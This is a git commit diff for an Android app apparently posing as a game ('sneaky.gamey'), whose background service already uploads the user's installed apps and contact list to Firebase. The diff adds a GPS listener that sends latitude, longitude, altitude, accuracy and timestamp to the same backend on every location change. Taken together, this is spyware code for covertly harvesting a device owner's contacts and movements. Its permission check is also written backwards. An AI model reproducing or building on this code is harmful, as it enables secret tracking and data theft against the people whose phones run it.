9131cec4a2cc2a458517c99039e913046c652397
nightowlish <oanaolf@gmail.com>
2020-11-16 02:32:36 +0200

    location listener

--- app/src/main/java/com/sneaky/gamey/services/MainService.java
+++ app/src/main/java/com/sneaky/gamey/services/MainService.java
@@ -1,15 +1,21 @@
 package com.sneaky.gamey.services;
 
+import android.Manifest;
 import android.app.Service;
 import android.content.ContentResolver;
 import android.content.Intent;
 import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
+import android.location.Location;
+import android.location.LocationListener;
+import android.location.LocationManager;
+import android.os.Bundle;
 import android.os.IBinder;
 import android.provider.ContactsContract;
 
 import androidx.annotation.Nullable;
+import androidx.core.app.ActivityCompat;
 
 import com.sneaky.gamey.database.Firebase;
 
@@ -24,8 +30,16 @@ public class MainService extends Service {
         Firebase.sendData(data);
         data = getContactList();
         Firebase.sendData(data);
+        startLocation();
 
         return super.onStartCommand(intent, flags, startId);
+    }
+
+    private void startLocation() {
+        LocationManager locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
+        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
+            locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 1000, 5, locationListener);
+        }
     }
 
     @Nullable
@@ -33,6 +47,35 @@ public class MainService extends Service {
     public IBinder onBind(Intent intent) {
         return null;
     }
+
+    private final LocationListener locationListener = new LocationListener() {
+        @Override
+        public void onLocationChanged(Location location) {
+            Firebase.sendData(getLocationData(location));
+        }
+
+        public ArrayList<String> getLocationData(Location location) {
+            ArrayList<String> data = new ArrayList<String>();
+            data.add(Double.toString(location.getLatitude()));
+            data.add(Double.toString(location.getLongitude()));
+            data.add(Double.toString(location.getAltitude()));
+            data.add(Float.toString(location.getAccuracy()));
+            data.add(Long.toString(location.getTime()));
+            return data;
+        }
+
+        @Override
+        public void onStatusChanged(String provider, int status, Bundle extras) {}
+
+        @Override
+        public void onProviderEnabled(String provider) {}
+
+        @Override
+        public void onProviderDisabled(String provider) {}
+
+        public void onStatusChanged(final Location location) {}
+    };
+
 
     private ArrayList<String> getInstalledApplications() {
         final PackageManager pm = getPackageManager();
